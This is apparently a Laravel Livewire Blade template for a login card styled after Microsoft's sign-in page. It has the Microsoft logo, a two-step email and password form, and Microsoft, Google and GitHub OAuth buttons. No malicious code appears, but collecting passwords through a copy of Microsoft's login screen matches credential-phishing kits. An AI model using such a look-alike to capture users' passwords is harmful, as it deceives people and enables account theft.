<div class="bg-white w-full max-w-md p-8 rounded-md shadow-sm">
    <div class="flex justify-center mb-6">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" class="h-6">
    </div>

    <h2 class="text-2xl font-semibold mb-4 text-gray-800">Sign in</h2>

    @if ($step === 'email')
        <form wire:submit.prevent="submitEmail">
            <label for="email" class="block text-sm mb-1">Email, phone, or Skype</label>
            <input type="text" id="email" wire:model="email"
                   class="w-full border border-gray-300 rounded-md px-3 py-2 mb-4 focus:ring-2 focus:ring-blue-600 focus:outline-none">
            @error('email') <span class="text-red-500 text-sm">{{ $message }}</span> @enderror

            <button type="submit"
                    class="w-full bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700 transition">
                Next
            </button>
        </form>
    @elseif ($step === 'password')
        <form wire:submit.prevent="submitPassword">
            <label for="password" class="block text-sm mb-1">Enter password</label>
            <input type="password" id="password" wire:model="password"
                   class="w-full border border-gray-300 rounded-md px-3 py-2 mb-4 focus:ring-2 focus:ring-blue-600 focus:outline-none">
            @error('password') <span class="text-red-500 text-sm">{{ $message }}</span> @enderror

            <button type="submit"
                    class="w-full bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700 transition">
                Sign in
            </button>
        </form>
    @endif

    <div class="mt-6 text-sm text-blue-600 hover:underline cursor-pointer">
        No account? <a href="#">Create one!</a>
    </div>

    <div class="mt-6 space-y-3">
        <!-- Microsoft Button -->
        <a href="{{ url('/auth/microsoft') }}"
           class="flex items-center justify-center bg-[#0078D4] hover:bg-[#005A9E] text-white font-semibold py-2 px-4 rounded-md shadow-sm focus:ring-2 focus:ring-[#0078D4]">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" class="h-5 w-5 mr-2">
            Sign in with Microsoft
        </a>

        <!-- Google Button -->
        <a href="{{ url('/auth/google') }}"
           class="flex items-center justify-center bg-white border border-gray-300 hover:bg-gray-100 text-gray-800 font-semibold py-2 px-4 rounded-md shadow-sm focus:ring-2 focus:ring-gray-300">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" class="h-5 w-5 mr-2">
            Sign in with Google
        </a>

        <!-- GitHub Button -->
        <a href="{{ url('/auth/github') }}"
           class="flex items-center justify-center bg-gray-900 hover:bg-gray-800 text-white font-semibold py-2 px-4 rounded-md shadow-sm focus:ring-2 focus:ring-gray-700">
            <svg class="h-5 w-5 mr-2" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 .5C5.73.5.5 5.73.5 12c0 5.08 3.29 9.39 7.86 10.93.58.11.79-.25.79-.56v-2.01c-3.2.7-3.87-1.54-3.87-1.54-.53-1.35-1.3-1.71-1.3-1.71-1.06-.72.08-.71.08-.71 1.17.08 1.78 1.2 1.78 1.2 1.04 1.78 2.73 1.27 3.4.97.11-.75.41-1.27.74-1.56-2.56-.29-5.26-1.28-5.26-5.7 0-1.26.45-2.29 1.2-3.1-.12-.29-.52-1.45.11-3.02 0 0 .97-.31 3.18 1.18a11.1 11.1 0 0 1 5.8 0c2.2-1.49 3.17-1.18 3.17-1.18.64 1.57.24 2.73.12 3.02.75.81 1.2 1.84 1.2 3.1 0 4.43-2.7 5.4-5.27 5.69.42.36.8 1.09.8 2.2v3.26c0 .31.21.68.8.56A10.5 10.5 0 0 0 23.5 12C23.5 5.73 18.27.5 12 .5z"/>
            </svg>
            Sign in with GitHub
        </a>
    </div>

    <div class="mt-10 text-xs text-gray-500 flex justify-between">
        <a href="#" class="hover:underline">Terms of use</a>
        <a href="#" class="hover:underline">Privacy & cookies</a>
    </div>
</div>